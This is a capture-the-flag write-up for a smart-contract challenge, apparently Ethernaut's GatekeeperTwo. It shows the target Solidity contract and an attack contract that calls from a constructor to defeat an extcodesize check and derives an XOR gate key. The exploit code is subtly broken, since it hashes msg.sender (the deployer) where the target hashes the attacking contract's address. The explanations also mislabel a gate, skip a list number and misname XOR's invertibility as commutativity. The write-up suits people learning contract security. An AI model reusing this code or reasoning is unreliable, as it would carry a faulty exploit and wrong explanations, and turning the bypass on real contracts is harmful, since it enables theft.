**Description**

Just like the first challenge, we have to bypass some checks. Before we get started, keep in mind two main things.
1. Calling a function from another contract in our context's `constructor`, makes it seem to the other contract that our contract has a size of 0.
3. The XOR operation is commutative, meaning that a ^ b = b ^ a and if a ^ b = c it means that c ^ a = b and c ^ b = a.

These two concepts are all we need for this challenge; let's take a look at the code.
- **GatekeeperTwo.sol**
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```
**Attack Scenario**
As we can see, for `gateKeeperOne` it is mandatory to call from a contract; now let's pay attention to the other gate; for `gateTwo` as mentioned before, to bypass this check we only need to call from the constructor; for the third one, it is required to do some calculations, of course not manually; we'll let our contract handle that; our attack contract will look like this.
- **Attack.sol**
```solidity=
contract Attack{
    bytes8 public initial_data;
    uint64 public converted;
    bytes8 public gateToSend;
    address instance = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;

    constructor(){
        initial_data = bytes8(keccak256(abi.encodePacked(msg.sender)));
        converted = uint64(initial_data);
        gateToSend = bytes8(converted ^ type(uint64).max);
        (bool success,) = instance.call(abi.encodeWithSignature("enter(bytes8)",gateToSend));
        require(success, "something went terribly wrong!");
    }

}
```